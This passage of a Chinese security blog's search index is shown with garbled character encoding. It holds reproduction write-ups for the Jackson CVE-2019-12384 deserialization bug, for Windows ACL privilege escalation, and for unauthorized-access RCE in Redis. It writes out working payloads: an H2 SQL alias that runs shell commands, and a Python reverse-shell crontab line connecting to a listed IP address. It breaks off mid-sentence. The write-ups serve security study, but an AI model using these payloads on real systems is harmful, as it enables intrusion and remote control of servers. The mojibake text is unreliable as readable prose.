","date":"2019-07-26","objectID":"/2019/07/jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:2:1","tags":["Jackson-databind","æ¼æ´å¤ç°"],"title":"CVE-2019-12384ï¼šJacksonååºåˆ—åŒ–æ¼æ´å¤ç°","uri":"/2019/07/jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["æ¼æ´å¤ç°"],"content":"æ„å»ºæ­¥éª¤ æœ¬æ–‡åœ¨IDEAä¸Šç”Ÿæˆé¡¹ç›® æ–°å»ºjava Commandlineé¡¹ç›® å°†ä¸Šè¿°ä»£ç æ›¿æ¢ç±» å•å‡»çº¢æ¡†ä¸­çš„å›¾æ ‡ï¼Œè¿›å…¥é¡¹ç›®ç»“æ„è®¾ç½® æŒ‰ç…§ä¸‹å›¾çš„æ­¥éª¤å°†ä¸‹è½½å¥½çš„å¤–éƒ¨jaråŒ…å¯¼å…¥é¡¹ç›®æ–‡ä»¶ ","date":"2019-07-26","objectID":"/2019/07/jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:2:2","tags":["Jackson-databind","æ¼æ´å¤ç°"],"title":"CVE-2019-12384ï¼šJacksonååºåˆ—åŒ–æ¼æ´å¤ç°","uri":"/2019/07/jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["æ¼æ´å¤ç°"],"content":"æ”»å‡»æµç¨‹ å°†ä¸‹é¢çš„sqlè„šæœ¬æ–‡ä»¶ä¿å­˜ä¸ºinject.sql CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException { String[] command = {\"bash\", \"-c\", cmd}; java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter(\"\\\\A\"); return s.hasNext() ? s.next() : \"\"; } $$; CALL SHELLEXEC('open /Applications/Calculator.app') æ³¨ï¼šæœ¬æ–‡åœ¨MacOSä¸‹æ‰§è¡Œçš„RCEï¼Œå¦‚åœ¨å…¶å®ƒç¯å¢ƒï¼Œè¯·è‡ªè¡Œæ›´æ¢CALL SHELLEXECä¸­çš„å‘½ä»¤ã€‚ æ‰§è¡Œæœ¬åœ°æ‰§è¡Œpython2 -m SimpleHTTPServer 80ï¼Œåœ¨æœ¬åœ°å¯åŠ¨HTTPæœåŠ¡ ","date":"2019-07-26","objectID":"/2019/07/jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:3:0","tags":["Jackson-databind","æ¼æ´å¤ç°"],"title":"CVE-2019-12384ï¼šJacksonååºåˆ—åŒ–æ¼æ´å¤ç°","uri":"/2019/07/jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["æ¼æ´å¤ç°"],"content":"RCE payloadæµ‹è¯• å°†javaæ–‡ä»¶ä¸­çš„payloadæ›´æ¢ä¸ºRCEï¼Œç¼–è¯‘å¹¶è¿è¡Œjavaç¨‹åº ","date":"2019-07-26","objectID":"/2019/07/jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:3:1","tags":["Jackson-databind","æ¼æ´å¤ç°"],"title":"CVE-2019-12384ï¼šJacksonååºåˆ—åŒ–æ¼æ´å¤ç°","uri":"/2019/07/jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["æ¼æ´å¤ç°"],"content":"SSRF payloadæµ‹è¯• æ‰§è¡Œnc -l -vv 4444ï¼Œä¾¿äºè§‚å¯ŸSSRFçš„ç»“æœ å°†javaæ–‡ä»¶ä¸­çš„payloadæ›´æ¢ä¸ºSSRFï¼Œç¼–è¯‘å¹¶è¿è¡Œjavaç¨‹åº ","date":"2019-07-26","objectID":"/2019/07/jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:3:2","tags":["Jackson-databind","æ¼æ´å¤ç°"],"title":"CVE-2019-12384ï¼šJacksonååºåˆ—åŒ–æ¼æ´å¤ç°","uri":"/2019/07/jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["æ¼æ´å¤ç°"],"content":"å‚è€ƒ https://blog.doyensec.com/2019/07/22/jackson-gadgets.html https://www.anquanke.com/post/id/182695 ","date":"2019-07-26","objectID":"/2019/07/jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:4:0","tags":["Jackson-databind","æ¼æ´å¤ç°"],"title":"CVE-2019-12384ï¼šJacksonååºåˆ—åŒ–æ¼æ´å¤ç°","uri":"/2019/07/jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"ç»„ç­–ç•¥ä¸ ACL åŸç†åŠå®éªŒ","date":"2019-07-24","objectID":"/2019/07/%E7%BB%84%E7%AD%96%E7%95%A5%E4%B8%8Eacl/","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"ç»„ç­–ç•¥ä¸ACL","uri":"/2019/07/%E7%BB%84%E7%AD%96%E7%95%A5%E4%B8%8Eacl/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"ç»„ç­–ç•¥çš„éƒ¨ç½²åŠä¸‹å‘åŸç† æœ¬åœ°ç»„ç­–ç•¥å’ŒåŸŸå†…ç»„ç­–ç•¥ åŸŸæœåŠ¡å™¨å¦‚ä½•å­˜å‚¨ç»„ç­–ç•¥ ç»„ç­–ç•¥çš„ä¸‹å‘å’Œè·å– å®¢æˆ·ç«¯å¦‚ä½•å­˜å‚¨ç»„ç­–ç•¥ ","date":"2019-07-24","objectID":"/2019/07/%E7%BB%84%E7%AD%96%E7%95%A5%E4%B8%8Eacl/:0:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"ç»„ç­–ç•¥ä¸ACL","uri":"/2019/07/%E7%BB%84%E7%AD%96%E7%95%A5%E4%B8%8Eacl/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"Server Manager çš„ç»„ç­–ç•¥ç®¡ç†å·¥å…· æ›´ä¸“ä¸šçš„ç»„ç­–ç•¥ç®¡ç†å·¥å…·GPMCï¼Œå¯ä»¥ç®¡ç†å¤šä¸ªåŸŸ åˆ›å»ºå¹¶ç¼–è¾‘ç»„ç­–ç•¥çš„å†…å®¹ ç»„ç­–ç•¥åˆ†ä½œä¸»æœºç­–ç•¥å’Œç”¨æˆ·ç­–ç•¥ï¼Œmachineå’Œusersç›®å½•ï¼› è„šæœ¬ç±»å‹å’Œéè„šæœ¬ç±»å‹, scriptç›®å½• ç®¡ç†ç»„ç­–ç•¥çš„åº”ç”¨èŒƒå›´(æ¼”ç¤º) ","date":"2019-07-24","objectID":"/2019/07/%E7%BB%84%E7%AD%96%E7%95%A5%E4%B8%8Eacl/:1:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"ç»„ç­–ç•¥ä¸ACL","uri":"/2019/07/%E7%BB%84%E7%AD%96%E7%95%A5%E4%B8%8Eacl/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"ç»„ç­–ç•¥çš„å­˜å‚¨ å­˜å‚¨åœ¨æœåŠ¡å™¨ä¸­ï¼Œ\\domain\\sysvol\\policiesï¼Œä»¥æ˜æ–‡æ–¹å¼å­˜å‚¨ä¸ºxmlã€iniã€infç­‰æ–‡ä»¶ å¯¹åŸŸå†…æ‰€æœ‰ç”¨æˆ·å¼€æ”¾è¯»æƒé™ ","date":"2019-07-24","objectID":"/2019/07/%E7%BB%84%E7%AD%96%E7%95%A5%E4%B8%8Eacl/:2:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"ç»„ç­–ç•¥ä¸ACL","uri":"/2019/07/%E7%BB%84%E7%AD%96%E7%95%A5%E4%B8%8Eacl/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"ç»„ç­–ç•¥çš„æ›´æ–° å®¢æˆ·ç«¯æ¯90åˆ†é’Ÿä¸»åŠ¨è·å–ä¸€æ¬¡ç»„ç­–ç•¥ï¼Œæ£€æŸ¥ç»„ç­–ç•¥æ˜¯å¦å‘ç”Ÿå˜æ›´ å®¢æˆ·ç«¯ä½¿ç”¨gpupdate /forceå¼ºåˆ¶ç«‹å³æ£€æŸ¥ç»„ç­–ç•¥ å‚æ•°å¯ä»¥åˆ†ä¸ºä¸»æœºå’Œç”¨æˆ·ï¼Œgpupdate /force /target:computer ","date":"2019-07-24","objectID":"/2019/07/%E7%BB%84%E7%AD%96%E7%95%A5%E4%B8%8Eacl/:3:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"ç»„ç­–ç•¥ä¸ACL","uri":"/2019/07/%E7%BB%84%E7%AD%96%E7%95%A5%E4%B8%8Eacl/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"ç»„ç­–ç•¥çš„ä¸‹å‘å’Œè·å– ç»„ç­–ç•¥çš„æŸ¥è¯¢åŸç†ï¼š LDAPæ£€ç´¢æ‰€æœ‰çš„ç»„ç­–ç•¥ï¼Œé‚£äº›å±äºè‡ªå·±çš„ æŸ¥è¯¢ç»„ç­–ç•¥ï¼ŒæœåŠ¡å™¨å†³å®šéœ€è¦è¿”å›å“ªäº›ç­–ç•¥ï¼ˆç‰ˆæœ¬å·æ˜¯å†³å®šçš„é‡è¦å› ç´ ï¼‰ ACL è®¿é—®æ§åˆ¶é“¾ ","date":"2019-07-24","objectID":"/2019/07/%E7%BB%84%E7%AD%96%E7%95%A5%E4%B8%8Eacl/:4:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"ç»„ç­–ç•¥ä¸ACL","uri":"/2019/07/%E7%BB%84%E7%AD%96%E7%95%A5%E4%B8%8Eacl/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"Access Control Link Windowså®‰å…¨å¯¹è±¡çš„ACL æ‰€æœ‰çš„Windowså¯¹è±¡éƒ½ç§°ä¸ºå®‰å…¨å¯¹è±¡ï¼Œæ–‡ä»¶ã€è¿›ç¨‹ã€æ³¨å†Œè¡¨ã€å†…å­˜ç­‰ ä¸ºæ¯ä¸ªå®‰å…¨å¯¹è±¡èµ‹äºˆä¸€ä¸ªå®‰å…¨æè¿°ç¬¦(Security descriptor) Security identifiers (SIDs)for the owner and primary group of an object A DACL that specifies the access rights allowed or denied to particular users or groups a SACL that specifies the types of access attempts that generate audit records for the object ","date":"2019-07-24","objectID":"/2019/07/%E7%BB%84%E7%AD%96%E7%95%A5%E4%B8%8Eacl/:5:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"ç»„ç­–ç•¥ä¸ACL","uri":"/2019/07/%E7%BB%84%E7%AD%96%E7%95%A5%E4%B8%8Eacl/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"DACL DACLç”±å¤šä¸ªACE(Access Control Entry)ç»„æˆ ","date":"2019-07-24","objectID":"/2019/07/%E7%BB%84%E7%AD%96%E7%95%A5%E4%B8%8Eacl/:6:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"ç»„ç­–ç•¥ä¸ACL","uri":"/2019/07/%E7%BB%84%E7%AD%96%E7%95%A5%E4%B8%8Eacl/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"Windows çš„è®¿é—®æ§åˆ¶ Windowsçš„è®¿é—®æ§åˆ¶åŒ…æ‹¬ä¸‰éƒ¨åˆ†:è®¿é—®ä»¤ç‰Œã€å¯¹è±¡å®‰å…¨æè¿°ç¬¦å’Œè®¿é—®æ£€æŸ¥ è®¿é—®ä»¤ç‰Œä½œä¸ºä¸€ä¸ªå®¹å™¨ï¼Œé€šè¿‡Tokenä½“ç° å¯¹è±¡å®‰å…¨æè¿°ç¬¦è¡¨ç¤ºç›®æ ‡å¯¹è±¡çš„å®‰å…¨å±æ€§ï¼Œé€šè¿‡å®‰å…¨çŸ©é˜µè¯¦ç»†æè¿°è¯¥å¯¹è±¡èµ‹äºˆä¸åŒç”¨æˆ·ç»„çš„æƒé™ è®¿é—®æ£€æŸ¥è¡¨ç¤ºé€šè¿‡æ¯”è¾ƒè®¿é—®ä»¤ç‰Œå’ŒACLï¼Œä»¥å†³å®šè¯¥è¿›ç¨‹æ˜¯å¦å…·æœ‰è®¿é—®æ—¶ç”³è¯·çš„ç›¸åº”æƒé™ Windowsä¸­é«˜æƒé™æœåŠ¡ã€è¿›ç¨‹æ‰€æ‹¥æœ‰çš„æ–‡ä»¶ã€ç›®å½•å¦‚æœå­˜åœ¨ç€ACLè®¾ç½®ä¸å½“ï¼Œå¯¹ä½æƒé™ç”¨æˆ·å¼€æ”¾äº†â€œå†™â€ç”šè‡³â€œæ‰§è¡Œâ€æƒé™ï¼Œä½æƒé™ç”¨æˆ·å¯ä»¥é€šè¿‡ä¿®æ”¹ã€æ›¿æ¢æ–‡ä»¶å†…å®¹æ¥è¾¾åˆ°æ‰§è¡ŒæŒ‡å®šä»£ç çš„ç›®çš„ã€‚ä¾‹å¦‚Windowsçš„System332ç›®å½•å¦‚æœå¼€æ”¾äº†å†™æƒé™,åˆ™å¯ä»¥å‘ç›®å½•å†™å…¥ä¸€ä¸ªDLL,ç­‰å¾…ç³»ç»Ÿé‡æ–°å¯åŠ¨æ˜¯,ç”± Svchostç­‰ç¨‹åºåŠ è½½å³å¯å®ç°æƒé™æå‡(æ¼”ç¤º) ","date":"2019-07-24","objectID":"/2019/07/%E7%BB%84%E7%AD%96%E7%95%A5%E4%B8%8Eacl/:7:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"ç»„ç­–ç•¥ä¸ACL","uri":"/2019/07/%E7%BB%84%E7%AD%96%E7%95%A5%E4%B8%8Eacl/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"ACL å®‰å…¨å®¡è®¡ Sysinternalsuitæä¾›çš„accesschk.exeå¯ä»¥å¯¹æŒ‡å®šçš„ç›®å½•ã€æ–‡ä»¶è¿›è¡ŒACLæ£€æŸ¥ï¼Œå‘½ä»¤ä¸ºaccesschk.exe -w -s directory å…¶ä¸­directoryä¸ºéœ€è¦æ£€æµ‹çš„ç›®å½• accesschk.exe,å¯ä»¥å®¡è®¡è¿›ç¨‹å¯¹æ‰€æœ‰ç”¨æˆ·ç»„å¼€æ”¾çš„æƒé™ã€‚é‡‡ç”¨è§„åˆ™accesschk.exe -ppidå¯ä»¥è·å–æŸä¸ªè¿›ç¨‹å¼€æ”¾çš„æƒé™ï¼Œå…¶ä¸­pidå¯ä»¥ç”¨â€˜*â€™ä»£ï¼Œè¡¨ç¤ºæ£€æµ‹æ‰€æœ‰è¿›ç¨‹å¯¹ä¸åŒç”¨æˆ·ç»„å¼€æ”¾çš„æƒé™ã€‚ä¸ºäº†ä¿è¯æ­£å¸¸è¿è¡Œ,è¿è¡ŒTaccesschk.exeæ—¶éœ€è¦è¾ƒé«˜çš„æƒé™ ","date":"2019-07-24","objectID":"/2019/07/%E7%BB%84%E7%AD%96%E7%95%A5%E4%B8%8Eacl/:8:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"ç»„ç­–ç•¥ä¸ACL","uri":"/2019/07/%E7%BB%84%E7%AD%96%E7%95%A5%E4%B8%8Eacl/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"åˆ©ç”¨ è¿›ç¨‹ACLæ¼æ´çš„åˆ©ç”¨æ–¹æ³• ","date":"2019-07-24","objectID":"/2019/07/%E7%BB%84%E7%AD%96%E7%95%A5%E4%B8%8Eacl/:9:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"ç»„ç­–ç•¥ä¸ACL","uri":"/2019/07/%E7%BB%84%E7%AD%96%E7%95%A5%E4%B8%8Eacl/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"ç¬¬ä¸€ç§ é€šè¿‡OpenProcessè·å–è¿›ç¨‹å¥æŸ„ï¼Œå¹¶å°†ç›®æ ‡ä»£ç å†™å…¥è¯¥è¿›ç¨‹ç©ºé—´ä¸­ï¼Œä»¥è¯¥è¿›ç¨‹çš„æƒé™è¿è¡Œè¿™äº›ä»£ç ï¼Œè¿è¡Œä»£ç æƒé™ä¸ºè¯¥è¿›ç¨‹æƒé™ï¼› ","date":"2019-07-24","objectID":"/2019/07/%E7%BB%84%E7%AD%96%E7%95%A5%E4%B8%8Eacl/:9:1","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"ç»„ç­–ç•¥ä¸ACL","uri":"/2019/07/%E7%BB%84%E7%AD%96%E7%95%A5%E4%B8%8Eacl/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"ç¬¬äºŒç§ é€šè¿‡OpenProcessè·å–è¿›ç¨‹å¥æŸ„ï¼Œå†é€šè¿‡OpenProcessTokenè·å–è¯¥è¿›ç¨‹çš„Tokenï¼Œå¹¶åˆ©ç”¨è¯¥Tokenié€šè¿‡CreateProcessAsUseræ–°çš„è¿›ç¨‹ï¼Œæ–°çš„è¿›ç¨‹æƒé™å’Œç›®æ ‡è¿›ç¨‹æƒé™ä¸€è‡´ã€‚ ","date":"2019-07-24","objectID":"/2019/07/%E7%BB%84%E7%AD%96%E7%95%A5%E4%B8%8Eacl/:9:2","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"ç»„ç­–ç•¥ä¸ACL","uri":"/2019/07/%E7%BB%84%E7%AD%96%E7%95%A5%E4%B8%8Eacl/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"æ³¨å†Œè¡¨çš„ ACL æ³¨å†Œè¡¨ä¸­çš„å¯åŠ¨é¡¹ã€æœåŠ¡åŠ è½½é¡¹å¦‚æœå¯¹ä½æƒé™ç”¨æˆ·å¼€å‘äº†å†™æƒé™ï¼Œä½æƒé™ç”¨æˆ·å¯ä»¥å‘è¿™äº›è¡¨é¡¹å†™å…¥æŒ‡å®šçš„æ–‡ä»¶ï¼Œç­‰å¾…ç³»ç»Ÿé‡æ–°å¯åŠ¨åå®ç°æƒé™æå‡ ä½¿ç”¨å‘½ä»¤accesschk.exe -w -s -k HKLMï¼Œè¡¨ç¤ºé€’å½’çš„æ‰«æHKLMä¸­å¼€æ”¾äº†å†™æƒé™çš„è¡¨é¡¹ ","date":"2019-07-24","objectID":"/2019/07/%E7%BB%84%E7%AD%96%E7%95%A5%E4%B8%8Eacl/:10:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"ç»„ç­–ç•¥ä¸ACL","uri":"/2019/07/%E7%BB%84%E7%AD%96%E7%95%A5%E4%B8%8Eacl/"},{"categories":["æ¼æ´å¤ç°"],"content":"Redis åŸºäºä¸»ä»å¤åˆ¶çš„ RCE åˆ©ç”¨æ–¹å¼","date":"2019-07-15","objectID":"/2019/07/redis%E5%9F%BA%E4%BA%8E%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E7%9A%84rce%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/","tags":["Redis","æ¼æ´å¤ç°"],"title":"Redis åŸºäºä¸»ä»å¤åˆ¶çš„ RCE åˆ©ç”¨æ–¹å¼","uri":"/2019/07/redis%E5%9F%BA%E4%BA%8E%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E7%9A%84rce%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/"},{"categories":["æ¼æ´å¤ç°"],"content":"Redis åŸºäºä¸»ä»å¤åˆ¶çš„ RCE åˆ©ç”¨æ–¹å¼ åœ¨ 2019 å¹´ 7 æœˆ 7 æ—¥ç»“æŸçš„ WCTF2019 Final ä¸Šï¼ŒLC/BC çš„æˆå‘˜ Pavel Toporkov åœ¨åˆ†äº«ä¼šä¸Šä»‹ç»äº†ä¸€ç§å…³äº redis æ–°ç‰ˆæœ¬çš„ RCE åˆ©ç”¨æ–¹å¼ï¼Œæ¯”èµ·ä»¥å‰çš„åˆ©ç”¨æ–¹å¼æ¥è¯´ï¼Œè¿™ç§åˆ©ç”¨æ–¹å¼æ›´ä¸ºé€šç”¨ï¼Œå±å®³ä¹Ÿæ›´å¤§ï¼Œä¸‹é¢å°±è®©æˆ‘ä»¬ä»ä»¥å‰çš„ redis RCE åˆ©ç”¨æ–¹å¼å‡ºå‘ï¼Œä¸€èµ·èŠèŠå…³äº redis çš„åˆ©ç”¨é—®é¢˜ã€‚ https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf ","date":"2019-07-15","objectID":"/2019/07/redis%E5%9F%BA%E4%BA%8E%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E7%9A%84rce%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/:0:0","tags":["Redis","æ¼æ´å¤ç°"],"title":"Redis åŸºäºä¸»ä»å¤åˆ¶çš„ RCE åˆ©ç”¨æ–¹å¼","uri":"/2019/07/redis%E5%9F%BA%E4%BA%8E%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E7%9A%84rce%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/"},{"categories":["æ¼æ´å¤ç°"],"content":"é€šè¿‡å†™å…¥æ–‡ä»¶ GetShell æœªæˆæƒçš„ redis ä¼šå¯¼è‡´ GetShellï¼Œåˆ©ç”¨æ–¹å¼å¦‚ä¸‹ï¼š 127.0.0.1:6379\u003e config set dir /var/spool/cron/crontabs OK 127.0.0.1:6379\u003e config set dbfilename root OK 127.0.0.1:6379\u003e get 1 \"\\n* * * * * /usr/bin/python -c 'import socket,subprocess,os,sys;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"IP\\\",6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"]);'\\n\" 127.0.0.1:6379\u003e save OK è€Œè¿™ç§æ–¹å¼æ˜¯é€šè¿‡å†™æ–‡ä»¶æ¥å®Œæˆ GetShell çš„ï¼Œè¿™ç§æ–¹å¼çš„ä¸»è¦é—®é¢˜åœ¨äºï¼Œredis ä¿å­˜çš„æ•°æ®å¹¶ä¸æ˜¯ç®€å•çš„ json æˆ–è€…æ˜¯ csvï¼Œæ‰€ä»¥å†™å…¥çš„æ–‡ä»¶éƒ½ä¼šæœ‰å¤§é‡çš„æ— ç”¨æ•°æ®ï¼Œå½¢ä¼¼ [padding] * * * * * /usr/bin/python -c 'import socket,subprocess,os,sys;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"115.28.78.16\\\",6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"]);' [padding] è¿™ç§ä¸»è¦åˆ©ç”¨äº† crontabã€ssh keyã€webshell è¿™æ ·çš„æ–‡ä»¶éƒ½æœ‰ä¸€å®šå®¹é”™æ€§ï¼Œå†åŠ ä¸Š crontab å’Œ ssh æœåŠ¡å¯ä»¥è¯´æ˜¯æœåŠ¡å™¨çš„æ ‡å‡†çš„æœåŠ¡ï¼Œæ‰€ä»¥åœ¨ä»¥å‰ï¼Œè¿™ç§é€šè¿‡å†™å…¥æ–‡ä»¶çš„ getshell æ–¹å¼åŸºæœ¬å°±å¯ä»¥è¯´æ˜¯å¾ˆé€šæ€äº†ã€‚ ä½†éšç€ç°ä»£çš„æœåŠ¡éƒ¨ç½²æ–¹å¼çš„ä¸æ–­å‘å±•ï¼Œç»„ä»¶åŒ–æˆäº†ä¸å¯é€ƒé¿çš„å¤§è¶‹åŠ¿ï¼Œdocker å°±æ˜¯è¿™è‚¡é£æ½®ä¸‹çš„äº§ç‰©ä¹‹ä¸€ï¼Œè€Œåœ¨è¿™ç§éƒ¨ç½²æ¨¡å¼ä¸‹ï¼Œä¸€ä¸ªå•ä¸€çš„å®¹å™¨ä¸­ä¸ä¼šæœ‰é™¤ redis ä»¥å¤–çš„ä»»ä½•æœåŠ¡å­˜åœ¨ï¼ŒåŒ…æ‹¬ ssh å’Œ crontabï¼Œå†åŠ ä¸Šæƒé™çš„ä¸¥æ ¼æ§åˆ¶ï¼Œåªé å†™æ–‡ä»¶å°±å¾ˆéš¾å† getshell äº†ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å°±éœ€è¦å…¶ä»–çš„åˆ©ç”¨æ‰‹æ®µäº†ã€‚ ","date":"2019-07-15","objectID":"/2019/07/redis%E5%9F%BA%E4%BA%8E%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E7%9A%84rce%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/:1:0","tags":["Redis","æ¼æ´å¤ç°"],"title":"Redis åŸºäºä¸»ä»å¤åˆ¶çš„ RCE åˆ©ç”¨æ–¹å¼","uri":"/2019/07/redis%E5%9F%BA%E4%BA%8E%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E7%9A%84rce%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/"},{"categories":["æ¼æ´å¤ç°"],"content":"é€šè¿‡ä¸»ä»å¤åˆ¶ GetShell ","date":"2019-07-15","objectID":"/2019/07/redis%E5%9F%BA%E4%BA%8E%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E7%9A%84rce%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/:2:0","tags":["Redis","æ¼æ´å¤ç°"],"title":"Redis åŸºäºä¸»ä»å¤åˆ¶çš„ RCE åˆ©ç”¨æ–¹å¼","uri":"/2019/07/redis%E5%9F%BA%E4%BA%8E%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E7%9A%84rce%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/"},{"categories":["æ¼æ´å¤ç°"],"content":"Redis ä¸»ä»å¤åˆ¶ Redis æ˜¯ä¸€ä¸ªä½¿ç”¨ ANSI C ç¼–å†™çš„å¼€æºã€æ”¯æŒç½‘ç»œã€åŸºäºå†…å­˜ã€å¯é€‰æŒä¹…æ€§çš„é”®å€¼å¯¹å­˜å‚¨æ•°æ®åº“ã€‚ä½†å¦‚æœå½“æŠŠæ•°æ®å­˜å‚¨åœ¨å•ä¸ª Redis çš„å®ä¾‹ä¸­ï¼Œå½“è¯»å†™ä½“é‡æ¯”è¾ƒå¤§çš„æ—¶å€™ï¼ŒæœåŠ¡ç«¯å°±å¾ˆéš¾æ‰¿å—ã€‚ä¸ºäº†åº”å¯¹è¿™ç§æƒ…å†µï¼ŒRedis å°±æä¾›äº†ä¸»ä»æ¨¡å¼ï¼Œä¸»ä»æ¨¡å¼å°±æ˜¯æŒ‡ä½¿ç”¨ä¸€ä¸ª redis å®ä¾‹ä½œä¸ºä¸»æœºï¼Œå…¶ä»–å®ä¾‹éƒ½ä½œä¸ºå¤‡ä»½æœºï¼Œå…¶ä¸­ä¸»æœºå’Œä»æœºæ•°æ®ç›¸åŒï¼Œè€Œä»æœºåªè´Ÿè´£è¯»ï¼Œä¸»æœºåªè´Ÿè´£å†™ï¼Œé€šè¿‡è¯»å†™åˆ†ç¦»å¯ä»¥å¤§å¹…åº¦å‡è½»æµé‡çš„å‹åŠ›ï¼Œç®—æ˜¯ä¸€ç§é€šè¿‡ç‰ºç‰²ç©ºé—´æ¥æ¢å–æ•ˆç‡çš„ç¼“è§£æ–¹å¼ã€‚ åˆ©ç”¨ä¸¤å° docker æ¥åšæµ‹è¯•ï¼š docker search redis5 docker pull damonevking/redis5.0 docker ps é€šè¿‡ slaveof å¯ä»¥è®¾ç½®ä¸»ä»çŠ¶æ€: é¦–å…ˆåœ¨ slave ä¸Šè®¾ç½®ï¼š ç„¶ååœ¨ master ä¸Šè®¾ç½®ï¼š åœ¨ slave ä¸Šï¼Œå¯ä»¥å‘ç°æ•°æ®å·²ç»åŒæ­¥ï¼š ","date":"2019-07-15","objectID":"/2019/07/redis%E5%9F%BA%E4%BA%8E%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E7%9A%84rce%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/:2:1","tags":["Redis","æ¼æ´å¤ç°"],"title":"Redis åŸºäºä¸»ä»å¤åˆ¶çš„ RCE åˆ©ç”¨æ–¹å¼","uri":"/2019/07/redis%E5%9F%BA%E4%BA%8E%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E7%9A%84rce%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/"},{"categories":["æ¼æ´å¤ç°"],"content":"Redis æ¨¡å— åœ¨äº†è§£äº†ä¸»ä»åŒæ­¥ä¹‹åï¼Œæˆ‘ä»¬è¿˜éœ€è¦å¯¹ redis çš„æ¨¡å—æœ‰æ‰€äº†è§£ã€‚ åœ¨ Reids 4.x ä¹‹åï¼ŒRedis 